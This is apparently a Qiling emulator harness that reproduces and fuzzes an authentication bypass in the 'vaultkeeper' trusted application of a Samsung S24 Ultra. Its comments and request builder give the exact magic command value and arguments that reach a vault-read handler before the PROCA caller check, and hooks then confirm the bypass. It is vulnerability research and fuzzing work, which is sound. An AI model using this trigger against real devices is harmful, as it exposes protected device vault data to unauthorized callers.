from .params import *
from qiling import Qiling
import struct, os

# === vaultkeeper S7 magic-fast-path repro + dispatcher fuzz harness =========
# Target: Samsung S24 Ultra (SM-S928B) VaultKeeper QTEE TA, vaultkeeper.ta (S7).
#
# Staging (see vaultkeeper.json): GP lifecycle stubbed; InvokeCommand points at
# the real top-level dispatcher
#   vk_dispatcher@0x318  (ABI: x0=req, w1=req_len, x2=resp, w3=resp_len).
#
# S7 logic (confirmed in binary):
#   0x350 bl qsee_is_ns_range(req, req_len)     ; NS gate (tbz w0,#0 to proceed)
#   0x394 bl qsee_is_ns_range(resp, resp_len)
#   0x498 ldr w8,[req]        ; req[0]
#   0x4a0 movk -> w9 = 0xC0DE0003
#   0x4a4 cmp / 0x4a8 b.ne 0x510 (non-magic -> length-check + PROCA)
#   0x4ac ldr w2,[req+4]      ; cmd_arg
#   0x4b8 cmp (cmd_arg-0xBC01) #5 / b.hi reject  ; in {0xBC01,0xBC03..0xBC06}
#   -> vk_bl_and_provision_handler@0x14ca8 reads AID/FMM/RAMPART/DMC vault into
#      resp+4, BEFORE the 44536/44544 length check and BEFORE PROCA.
#
# Request header (vk_request_t):
#   +0x00 cmd_no   (u32)  == 0xC0DE0003 selects the bootloader magic fast-path
#   +0x04 cmd_arg  (u32)  in {0xBC01,0xBC03,0xBC04,0xBC05,0xBC06}
#   +0x08 client_name[0x80]
#   +0x88 vault_name[0x20]
#   +0xA8 payload...
#
# S7 DEMONSTRATION (default / VK_MODE=magic): cmd_no=0xC0DE0003, cmd_arg=0xBC03
# (AID). This drives the unauthenticated vault-read fast-path end-to-end through
# the dispatcher with PROCA skipped. The vault read pulls from storage
# (qsee_stor_*/qsee_sfs_* are modeled as zero-fill success), so the response gets
# the "Allzero" path (the vault body is all-zero in the emulator). The dynamic
# proof is that the dispatcher REACHES vk_bl_and_provision_handler with the magic
# alone (no PROCA call), i.e. the unauth path is live. (S7 is a LOGIC/auth-bypass
# bug, not memory-corruption: no asan crash on this path; clean lifecycle.)
#
# FUZZ MODE (no VK_MODE): AFL drives cmd_no, cmd_arg, and the payload head. It
# explores both the magic fast-path (vk_bl_and_provision_handler) and the
# non-magic length-check path. The full request buffer is attacker-mapped at
# the demanded 44536-byte size so a parser reading off the end faults.

AFL_EXIT  = 0x13370
REQ_LEN   = 44536           # 0xADF8 — the exact req_len the non-magic path demands
RESP_LEN  = 44544           # 0xAE00 — the exact resp_len demanded

REQ_BASE  = 0x51000000
REQ_SIZE  = 0xC000          # > 44536, page-aligned
RESP_BASE = 0x52000000
RESP_SIZE = 0xC000

MAGIC          = 0xC0DE0003
CMD_ARG_AID    = 0xBC03     # AID vault read
VK_MODE        = os.environ.get("VK_MODE", "")


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, size, name in ((REQ_BASE, REQ_SIZE, "req"), (RESP_BASE, RESP_SIZE, "resp")):
        try:
            ql.mem.map(base, size, info=f"[vk] {name}")
        except Exception as e:
            ql.log.warning(f"[vk] map {name} @ {hex(base)}: {e}")
    # AFL_EXIT landing pad: the magic fast-path TAIL-CALLS vk_bl_and_provision_
    # handler (b #0x14ca8) after restoring x30, so a benign request returns to
    # x30 = AFL_EXIT (0x13370) rather than flowing through the dispatcher's ret
    # @0x48c. 0x13370 is an InvokeCommand _end (so the replay pivot / fuzz exit
    # stops there) but it must be a MAPPED, executable instruction or the `ret`
    # to it faults before the hook fires. Map one page with a self-loop `b .`.
    pad = 0x13370 & ~0xFFF
    try:
        ql.mem.map(pad, 0x1000, info="[vk] AFL_EXIT pad")
        ql.mem.write(0x13370, b"\x00\x00\x00\x14")   # b . (self-loop)
    except Exception as e:
        ql.log.warning(f"[vk] map AFL_EXIT pad: {e}")

    # VK_TRACE: dynamic proof of the S7 auth-bypass ORDERING. The magic fast-path
    # enters vk_bl_and_provision_handler@0x14ca8 to read the vault, and it must do
    # so WITHOUT a PROCA call (PaTzVerifyProcess@0x18a50). We count PROCA calls and
    # stop the instant the handler is reached, printing the count. (The handler's
    # subsequent RPMB read loops in-emulator without a real storage backend, so we
    # don't run it to completion; the auth-bypass is proven by reaching it with
    # PROCA-count==0.) The non-magic path, by contrast, calls PaTzVerifyProcess
    # before process_vault_cmd.
    if os.environ.get("VK_TRACE"):
        ta_base = ql.mem.get_lib_base("vaultkeeper.ta")
        st = {"proca": 0}

        def _on_proca(q):
            st["proca"] += 1
            q.log.warning(f"[vk_trace] PaTzVerifyProcess called (count={st['proca']})")

        def _on_handler(q):
            q.log.warning(
                f"[vk_trace] *** REACHED vk_bl_and_provision_handler@0x14ca8 *** "
                f"with PROCA-call-count = {st['proca']} "
                f"({'AUTH BYPASS CONFIRMED' if st['proca'] == 0 else 'PROCA RAN'})"
            )
            q.stop()

        ql.hook_address(_on_proca, ta_base + 0x18a50)
        ql.hook_address(_on_handler, ta_base + 0x14ca8)

        # waypoint hits (find where the magic path goes)
        seen = {}
        for v in (0x498, 0x4a8, 0x7d8, 0x804, 0x510, 0x3288):
            def mk(vv):
                def h(q):
                    if vv not in seen:
                        seen[vv] = 1
                        q.log.warning(f"[vk_trace] waypoint {hex(vv)} hit")
                return h
            ql.hook_address(mk(v), ta_base + v)
        if os.environ.get("VK_SAMPLE"):
            cnt = {"n": 0}
            def _blk(q, addr, size):
                cnt["n"] += 1
                if cnt["n"] % 300000 == 0:
                    q.log.warning(f"[vk_trace] loop sample: pc(rel)={hex((q.arch.regs.arch_pc - ta_base) & 0xFFFFFFFFFFFFFFFF)} n={cnt['n']}")
                if cnt["n"] >= 1200000:
                    q.log.warning("[vk_trace] loop cap hit -> stop")
                    q.stop()
            ql.hook_block(_blk)
        print(f"[vk] VK_TRACE: ta_base={hex(ta_base)} hooks @ handler 0x14ca8 / PROCA 0x18a50")

    print(f"[vk] init: req@{hex(REQ_BASE)} resp@{hex(RESP_BASE)} mode={VK_MODE or 'fuzz'}")


def _build_req(cmd_no, cmd_arg, payload=b""):
    buf = bytearray(REQ_LEN)
    struct.pack_into("<I", buf, 0x00, cmd_no & 0xFFFFFFFF)
    struct.pack_into("<I", buf, 0x04, cmd_arg & 0xFFFFFFFF)
    if payload:
        n = min(len(payload), REQ_LEN - 0xA8)
        buf[0xA8:0xA8 + n] = payload[:n]
    return bytes(buf)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    if VK_MODE == "magic":
        cmd_no, cmd_arg, payload = MAGIC, CMD_ARG_AID, b""
        print(f"[vk] S7 magic: cmd_no={cmd_no:#x} cmd_arg={cmd_arg:#x} (AID) "
              f"-> expect vk_bl_and_provision_handler reached with NO PROCA call")
    else:
        cmd_no  = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else MAGIC
        cmd_arg = struct.unpack_from("<I", input, 4)[0] if len(input) >= 8 else CMD_ARG_AID
        payload = input[8:8 + 0x800]

    req = _build_req(cmd_no, cmd_arg, payload)
    ql.mem.write(REQ_BASE, req + b"\x00" * (REQ_SIZE - len(req)))
    ql.mem.write(RESP_BASE, b"\x00" * RESP_SIZE)

    setup_params_fuzz(ql, 0, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # vk_dispatcher(x0=req, w1=req_len, x2=resp, w3=resp_len)
    ql.arch.regs.x0 = REQ_BASE
    ql.arch.regs.x1 = REQ_LEN
    ql.arch.regs.x2 = RESP_BASE
    ql.arch.regs.x3 = RESP_LEN
    ql.arch.regs.x30 = AFL_EXIT
    return True
